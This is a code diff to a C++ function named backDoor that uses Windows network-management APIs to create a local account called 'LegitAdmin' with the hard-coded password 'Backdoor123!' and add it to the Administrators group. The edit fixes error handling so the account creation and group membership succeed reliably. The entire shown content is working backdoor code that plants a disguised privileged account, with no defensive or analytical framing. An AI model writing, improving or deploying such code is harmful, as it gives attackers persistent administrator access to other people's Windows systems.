@@ -7,7 +7,8 @@ wstring name = L"LegitAdmin";
 LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
 wstring password = L"Backdoor123!";
 LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
-DWORD adduserStatus = -1;
+DWORD adduserStatus;
+DWORD errorInStruct;
 wstring adminGroup = L"Administrators";
 USER_INFO_1 userinfo;
 
@@ -24,12 +25,13 @@ int backDoor(USER_INFO_1 userinfo){
     userinfo.usri1_script_path = NULL;
     _LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
     localgroupinfo.lgrmi3_domainandname = lpName;
-    NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &adduserStatus);
+    adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
     if (adduserStatus)
     {
         return adduserStatus;
+       
     }
-    NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
+    adduserStatus = NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
     if (adduserStatus)
     {
         return adduserStatus;
